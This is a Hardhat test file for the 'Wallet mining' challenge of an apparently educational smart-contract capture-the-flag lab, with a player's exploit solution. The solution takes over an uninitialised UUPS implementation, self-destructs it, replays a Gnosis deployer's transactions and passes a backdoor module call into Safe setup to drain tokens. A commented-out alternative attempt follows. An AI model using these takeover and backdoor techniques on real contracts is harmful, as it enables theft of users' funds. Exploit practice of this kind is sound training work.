const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { Factory, Copy, Upgrade } = require("./deployment.json");
const { getImplementationAddress } = require('@openzeppelin/upgrades-core');

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;

    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, ward, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
            { kind: 'uups', initializer: 'init' }
        );

        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);

        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // https://systemweakness.com/damn-vulnerable-defi-v3-13-wallet-mining-solution-d5147533fa49

        // due to this vulunerablility https://forum.openzeppelin.com/t/security-advisory-initialize-uups-implementation-contracts/15301
        // owner of the implementation contract has not init
        const implementationAddress = await getImplementationAddress(ethers.provider, authorizer.address);
        await authorizer.attach(implementationAddress).connect(player).init([], []);
        expect(await authorizer.attach(implementationAddress).owner()).to.eq(player.address);
        expect(await authorizer.owner()).to.not.eq(player.address);

        // selfdestruct the authorizer implementation contract so that wallerDeployer.drop always pass
        fakeAuthorizer = await (await ethers.getContractFactory('FakeAuthorizer', player)).deploy();
        data = fakeAuthorizer.interface.encodeFunctionData("callDestruct");
        await authorizer.attach(implementationAddress).connect(player).upgradeToAndCall(fakeAuthorizer.address, data);
        expect(await ethers.provider.getCode(implementationAddress)).to.eq('0x');

        // deploy gnosis safe factory & safe master copy
        let gnosisDeployer = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A";
        await player.sendTransaction({
            to: gnosisDeployer,
            value: ethers.utils.parseEther("1"),
        });

        // replay first 3 transaction of gnosisDeployer found on etherscan.io
        await ethers.provider.sendTransaction(Copy);
        await ethers.provider.sendTransaction(Upgrade);
        await ethers.provider.sendTransaction(Factory);

        // deploy steal contract
        steal = await (await ethers.getContractFactory('StealFromWalletMining', player)).deploy();
        copy = await ethers.getContractFactory('GnosisSafe', player)
        data = steal.interface.encodeFunctionData("approveBackdoor", [token.address, player.address]);
        data2 = copy.interface.encodeFunctionData("setup", [
            [player.address],
            1,
            steal.address,
            data,
            ethers.constants.AddressZero,
            ethers.constants.AddressZero,
            0,
            ethers.constants.AddressZero
        ])

        let pay = await walletDeployer.pay();
        while (true) {
            tx = await walletDeployer.connect(player).drop(data2);
            if (await token.balanceOf(walletDeployer.address) < pay) {
                // break when drained all token from walletDeployer 
                break;
            }
        }

        // const gnosis_deployer = await ethers.getImpersonatedSigner("0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A")
        // await setBalance(gnosis_deployer.address, 10n ** 18n);
        // masterCopy = await (await ethers.getContractFactory('GnosisSafe', gnosis_deployer)).deploy();
        // _ = await (await ethers.getContractFactory('FakeFactory', gnosis_deployer)).deploy(DEPOSIT_ADDRESS);
        // walletFactory = await (await ethers.getContractFactory('FakeFactory', gnosis_deployer)).deploy(DEPOSIT_ADDRESS);

        // steal = await (await ethers.getContractFactory('StealFromWalletMining', player)).deploy();
        // data = steal.interface.encodeFunctionData("approveBackdoor", [token.address, player.address]);
        // data2 = initCode = masterCopy.interface.encodeFunctionData("setup", [
        //     [player.address],
        //     1,
        //     steal.address,
        //     data,
        //     ethers.constants.AddressZero,
        //     ethers.constants.AddressZero,
        //     0,
        //     ethers.constants.AddressZero
        // ])


        // i = 1;
        // while (true) {
        //     console.log(i);
        //     tx = await walletDeployer.connect(ward).drop(data2);
        //     rc = await tx.wait();
        //     // tx = await walletFactory.connect(player).createProxy(masterCopy.address, data2);
        //     // await expect(tx).to.emit(walletFactory, 'ProxyCreation');
        //     // rc = await tx.wait(); // 0ms, as tx is already confirmed
        //     // const event = rc.events.find(event => event.event === 'ProxyCreation'); // retrieve event emitted
        //     // w = event.args['proxy'];
        //     // if (w.toLowerCase() == DEPOSIT_ADDRESS.toLowerCase()) {
        //     // break;
        //     // }
        //     w = getContractAddress({ from: walletFactory.address, nonce: i });
        //     if (await token.balanceOf(w) > 0) {
        //         await token.connect(player).transferFrom(w, player.address, token.balanceOf(w));
        //     }
        //     if (w.toLowerCase() == DEPOSIT_ADDRESS.toLowerCase()) {
        //         console.log("break")
        //         break;
        //     }
        //     i++;
        // }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');

        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT));
    });
});
